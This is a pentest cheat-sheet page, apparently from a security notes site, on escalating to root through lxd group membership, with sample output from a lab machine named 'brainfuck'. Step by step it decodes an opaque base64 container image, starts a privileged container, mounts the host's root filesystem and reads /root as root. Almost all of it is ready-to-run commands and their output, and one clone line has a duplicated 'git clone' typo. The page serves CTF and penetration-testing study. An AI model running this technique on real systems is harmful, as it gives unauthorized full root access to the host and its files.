---
title: "lxd"
date: 2024-6-28
tags: ["File System Permissions Vulnerabilities", "File System Mounting", "Lxd", "Lxc", "Container"]
---

### Basic Commands

```console
# Check if user in lxd group
id
```

```console {class="sample-code"}
orestis@brainfuck:~$ id
uid=1000(orestis) gid=1000(orestis) groups=1000(orestis),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),121(lpadmin),122(sambashare)
```

```console
# List containers
lxc list
```

```console {class="sample-code"}
orestis@brainfuck:~$ lxc list
Generating a client certificate. This may take a minute...
If this is your first time using LXD, you should also run: sudo lxd init
To start your first container, try: lxc launch ubuntu:16.04

+------+-------+------+------+------+-----------+
| NAME | STATE | IPV4 | IPV6 | TYPE | SNAPSHOTS |
+------+-------+------+------+------+-----------+
```

```console
# List images
lxc image list
```

```console {class="sample-code"}
orestis@brainfuck:~$ lxc image list
+-------+-------------+--------+-------------+------+------+-------------+
| ALIAS | FINGERPRINT | PUBLIC | DESCRIPTION | ARCH | SIZE | UPLOAD DATE |
+-------+-------------+--------+-------------+------+------+-------------+
```

---

### Abuse #1: Mount host's file system

```console
# Upload a 656 bytes conatiner image
echo QlpoOTFBWSZTWaxzK54ABPR/p86QAEBoA//QAA3voP/v3+AACAAEgACQAIAIQAK8KAKCGURPUPJGRp6gNAAAAGgeoA5gE0wCZDAAEwTAAADmATTAJkMAATBMAAAEiIIEp5CepmQmSNNqeoafqZTxQ00HtU9EC9/dr7/586W+tl+zW5or5/vSkzToXUxptsDiZIE17U20gexCSAp1Z9b9+MnY7TS1KUmZjspN0MQ23dsPcIFWwEtQMbTa3JGLHE0olggWQgXSgTSQoSEHl4PZ7N0+FtnTigWSAWkA+WPkw40ggZVvYfaxI3IgBhip9pfFZV5Lm4lCBExydrO+DGwFGsZbYRdsmZxwDUTdlla0y27s5Euzp+Ec4hAt+2AQL58OHZEcPFHieKvHnfyU/EEC07m9ka56FyQh/LsrzVNsIkYLvayQzNAnigX0venhCMc9XRpFEVYJ0wRpKrjabiC9ZAiXaHObAY6oBiFdpBlggUJVMLNKLRQpDoGDIwfle01yQqWxwrKE5aMWOglhlUQQUit6VogV2cD01i0xysiYbzerOUWyrpCAvE41pCFYVoRPj/B28wSZUy/TaUHYx9GkfEYg9mcAilQ+nPCBfgZ5fl3GuPmfUOB3sbFm6/bRA0nXChku7aaN+AueYzqhKOKiBPjLlAAvxBAjAmSJWD5AqhLv/fWja66s7omu/ZTHcC24QJ83NrM67KACLACNUcnJjTTHCCDUIUJtOtN+7rQL+kCm4+U9Wj19YXFhxaXVt6Ph1ALRKOV9Xb7Sm68oF7nhyvegWjELKFH3XiWstVNGgTQTWoCjDnpXh9+/JXxIg4i8mvNobXGIXbmrGeOvXE8pou6wdqSD/F3JFOFCQrHMrng= | base64 -d > test.tar.bz2
```

```console {class="sample-code"}
orestis@brainfuck:~$ echo QlpoOTFBWSZTWaxzK54ABPR/p86QAEBoA//QAA3voP/v3+AACAAEgACQAIAIQAK8KAKCGURPUPJGRp6gNAAAAGgeoA5gE0wCZDAAEwTAAADmATTAJkMAATBMAAAEiIIEp5CepmQmSNNqeoafqZTxQ00HtU9EC9/dr7/586W+tl+zW5or5/vSkzToXUxptsDiZIE17U20gexCSAp1Z9b9+MnY7TS1KUmZjspN0MQ23dsPcIFWwEtQMbTa3JGLHE0olggWQgXSgTSQoSEHl4PZ7N0+FtnTigWSAWkA+WPkw40ggZVvYfaxI3IgBhip9pfFZV5Lm4lCBExydrO+DGwFGsZbYRdsmZxwDUTdlla0y27s5Euzp+Ec4hAt+2AQL58OHZEcPFHieKvHnfyU/EEC07m9ka56FyQh/LsrzVNsIkYLvayQzNAnigX0venhCMc9XRpFEVYJ0wRpKrjabiC9ZAiXaHObAY6oBiFdpBlggUJVMLNKLRQpDoGDIwfle01yQqWxwrKE5aMWOglhlUQQUit6VogV2cD01i0xysiYbzerOUWyrpCAvE41pCFYVoRPj/B28wSZUy/TaUHYx9GkfEYg9mcAilQ+nPCBfgZ5fl3GuPmfUOB3sbFm6/bRA0nXChku7aaN+AueYzqhKOKiBPjLlAAvxBAjAmSJWD5AqhLv/fWja66s7omu/ZTHcC24QJ83NrM67KACLACNUcnJjTTHCCDUIUJtOtN+7rQL+kCm4+U9Wj19YXFhxaXVt6Ph1ALRKOV9Xb7Sm68oF7nhyvegWjELKFH3XiWstVNGgTQTWoCjDnpXh9+/JXxIg4i8mvNobXGIXbmrGeOvXE8pou6wdqSD/F3JFOFCQrHMrng= | base64 -d > test.tar.bz2
```

```console
# Import image
lxc image import test.tar.bz2 --alias testImage
```

```console {class="sample-code"}
orestis@brainfuck:~$ lxc image import test.tar.bz2 --alias testImage
Image imported with fingerprint: 8961bb8704bc3fd43269c88f8103cab4fccd55325dd45f98e3ec7c75e501051d
```

```console
# Check image
lxc image list
```

```console {class="sample-code"}
orestis@brainfuck:~$ lxc image list
+-----------+--------------+--------+-------------+--------+--------+------------------------------+
|   ALIAS   | FINGERPRINT  | PUBLIC | DESCRIPTION |  ARCH  |  SIZE  |         UPLOAD DATE          |
+-----------+--------------+--------+-------------+--------+--------+------------------------------+
| testImage | 8961bb8704bc | no     |             | x86_64 | 0.00MB | Sep 24, 2024 at 8:26am (UTC) |
+-----------+--------------+--------+-------------+--------+--------+------------------------------+
```

```console
# Init VM
lxc init testImage testVM -c security.privileged=true
```

```console {class="sample-code"}
orestis@brainfuck:~$ lxc init testImage testVM -c security.privileged=true
Creating testVM
```

```console
# Mount the host /
lxc config device add testVM realRoot disk source=/ path=r
```

```console {class="sample-code"}
orestis@brainfuck:~$ lxc config device add testVM realRoot disk source=/ path=r
Device realRoot added to testVM
```

```console
# Start VM
lxc start testVM
```

```console {class="sample-code"}
orestis@brainfuck:~$ lxc start testVM
```

```console
# Check containers
lxc list
```

```console {class="sample-code"}
orestis@brainfuck:~$ lxc list
+--------+---------+------+------+------------+-----------+
|  NAME  |  STATE  | IPV4 | IPV6 |    TYPE    | SNAPSHOTS |
+--------+---------+------+------+------------+-----------+
| testVM | RUNNING |      |      | PERSISTENT | 0         |
+--------+---------+------+------+------------+-----------+
```

```console
# Execute as root inside container
lxc exec testVM -- /bin/bash
```

```console {class="sample-code"}
orestis@brainfuck:~$ lxc exec testVM -- /bin/bash
bash-4.3# 
```

```console
# We have full access on host disk thru /r/
ls -la /r/root
```

```console {class="sample-code"}
bash-4.3# ls -la /r/root
total 32
drwx------  4 root root 4096 Oct  3  2022 .
drwxr-xr-x 23 root root 4096 Sep 15  2022 ..
lrwxrwxrwx  1 root root    9 Sep 15  2022 .bash_history -> /dev/null
-rw-r--r--  1 root root 3106 Oct 22  2015 .bashrc
drwx------  2 root root 4096 May  5  2017 .cache
-rw-------  1 root root   66 Oct  3  2022 .mysql_history
drwxr-xr-x  2 root root 4096 Oct  3  2022 .nano
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-r--------  1 root root   33 Apr 29  2017 root.txt
```

---

### Build image for other arch

```console
git clone git clone https://github.com/saghul/lxd-alpine-builder
```

```console
cd lxd-alpine-builder      
```

```console
# For example arch i686
sudo ./build-alpine -a i686
```
